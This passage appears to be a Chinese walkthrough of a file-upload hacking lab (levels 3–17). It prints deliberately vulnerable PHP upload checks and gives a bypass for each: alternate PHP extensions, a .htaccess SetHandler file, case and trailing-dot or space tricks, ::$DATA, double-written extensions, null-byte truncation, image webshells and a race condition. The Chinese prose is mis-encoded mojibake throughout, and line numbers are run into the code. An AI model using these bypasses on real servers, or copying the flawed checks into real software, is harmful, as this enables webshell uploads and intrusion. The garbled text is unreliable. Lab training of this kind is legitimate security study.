'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; ç¬¬3å…³ php3 phtml1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; é»‘åå•åˆ¤æ–­ï¼Œäºæ˜¯å°è¯•ç”¨php3,phtmlç»•è¿‡ apache httpd.confè¿›è¡Œé…ç½® 1AddType application/x-httpd-php .php .php3 .phtml MimeTypesè¡¨ å½“phpé‚‚é€…windowsé€šç”¨ä¸Šä¼ ç¼ºé™· åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šè€ƒè™‘åˆ°æ–‡ä»¶åæˆªæ–­ï¼Œå¦‚%00 ç­‰.. å¯èƒ½è¿˜ä¼šç”¨å†’å·(â€œ:â€)å»æˆªæ–­ 13.php:jpg å†’å·æˆªæ–­äº§ç”Ÿçš„æ–‡ä»¶æ˜¯ç©ºç™½çš„ï¼Œé‡Œé¢å¹¶ä¸ä¼šæœ‰ä»»ä½•çš„å†…å®¹ ä¼šå†™å…¥ä¸€ä¸ª3.phpçš„ç©ºæ–‡ä»¶ &lt; å°±ç­‰äº **,è€Œ*ä»£ç ä»»æ„å­—ç¬¦ï¼Œäºæ˜¯ä¹å¯ä»¥è¿™æ ·ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶åï¼Œå¦‚ä¸‹ï¼š ç„¶åä¿®æ”¹åå­—ä¸º 123.&lt;&lt;&lt;&lt;?php phpinfo();?&gt; ç¬¬4å…³ .htaccess1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; æ˜¯é»‘åå•ï¼Œä½†å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰æœ‰é—®é¢˜çš„åç¼€åï¼Œé™¤äº†.htaccessï¼Œäºæ˜¯é¦–å…ˆä¸Šä¼ ä¸€ä¸ª.htaccesså†…å®¹å¦‚ä¸‹çš„æ–‡ä»¶: 1SetHandler application/x-httpd-php ç„¶åéšä¾¿ä¸Šä¼ ä¸€ä¸ªåç¼€éƒ½ä¼šè§£æä¸ºphp ç¬¬5å…³ å¤§å°å†™12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; å¤§å°å†™è§„åˆ™ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨phPåç¼€ä¸Šä¼ çªç ´ã€‚ ç¬¬6å…³ ç©ºæ ¼1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼ ç¬¬7å…³ ç‚¹1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; æ²¡æœ‰åˆ é™¤ç»“å°¾çš„â€œ.â€ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡ ç¬¬8å…³ DATA12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; è¿˜æ˜¯é»‘åå•ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»::$DATAå¤„ç†ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ ::$DATAç»•è¿‡ï¼š ç¬¬9å…³ ç‚¹+ç©ºæ ¼+ç‚¹123456789101112131415161718192021222324252627282930&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; é»‘åå•è¿‡æ»¤ï¼Œæ³¨æ„ä¸‹é¢è¿™è¡Œå’Œä¹‹å‰ä¸å¤ªä¸€æ ·ï¼Œè·¯å¾„æ‹¼æ¥çš„æ˜¯å¤„ç†åçš„æ–‡ä»¶å: 1$img_path = UPLOAD_PATH.'/'.$file_name; åŸç†åŒPass-06ï¼Œä¸Šä¼ æ–‡ä»¶åååŠ ä¸Šç‚¹+ç©ºæ ¼+ç‚¹ 1shell.php. . ç¬¬10å…³ åµŒå¥—ç»•è¿‡123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125;?&gt; åªæ˜¯çš„åˆ é™¤ï¼š 1$file_name = str_ireplace($deny_ext,\"\", $file_name); ä»¥åˆ©ç”¨åŒå†™(åµŒå¥—)ç»•è¿‡ 1shell.pphphp ç¬¬11å…³ GETå‹00æˆªæ–­1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125;&#125;?&gt; ç™½åå•åˆ¤æ–­ï¼Œä½†æ˜¯$img_pathç›´æ¥æ‹¼æ¥: 1$img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; å› æ­¤å¯ä»¥åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ï¼š éœ€å…³é—­magic_quotes_gpc php ç‰ˆæœ¬&lt;5.3.4 ç¬¬12å…³ POSTå‹00æˆªæ–­1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å¤±è´¥\"; &#125; &#125; else &#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125;&#125;?&gt; save_pathæ˜¯é€šè¿‡postä¼ è¿›æ¥çš„: 1$img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; è¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œä½†è¿™æ¬¡éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚ ç¬¬13å…³ å›¾é©¬123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;&#125;?&gt; getReailFileTypeå‡½æ•°åªä¼šè¯»å–æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚: 12$file = fopen($filename, \"rb\");$bin = fread($file, 2); //åªè¯»2å­—èŠ‚ æ‰€ä»¥æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªæ–‡ä»¶å¤´å³å¯ï¼Œä½¿ç”¨å›¾é©¬å¯ä»¥è½»æ¾ç»•è¿‡ã€‚åˆ©ç”¨çš„è¯ï¼Œè¿˜éœ€è¦ç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚ ç¬¬14å…³ getimagesize123456789101112131415161718192021222324252627282930313233&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;&#125;?&gt; æ ¡éªŒäº†æ–‡ä»¶å¤´ï¼š 1$info = getimagesize($filename); åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ ç¬¬15å…³ exif_imagetype12345678910111213141516171819202122232425262728293031323334353637&lt;?phpfunction isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;&#125;?&gt; php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ï¼š 1$image_type = exif_imagetype($filename); ç¬¬16å…³ äºŒæ¬¡æ¸²æŸ“ç»•è¿‡1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,\".\"),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼\"; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).\".jpg\"; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼\"; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).\".png\"; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼\"; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).\".gif\"; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;else&#123; $msg = \"åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼\"; &#125;&#125;?&gt; æœ¬å…³ç»¼åˆåˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“. https://yang1k.github.io/2018/08/30/upload-pass16/ ç¬¬17å…³ æ¡ä»¶ç«äº‰12345678910111213141516171819202122232425&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; unlink($upload_file); &#125; &#125;else&#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125;&#125;?&gt; åˆ©ç”¨æ¡ä»¶ç«äº‰åˆ 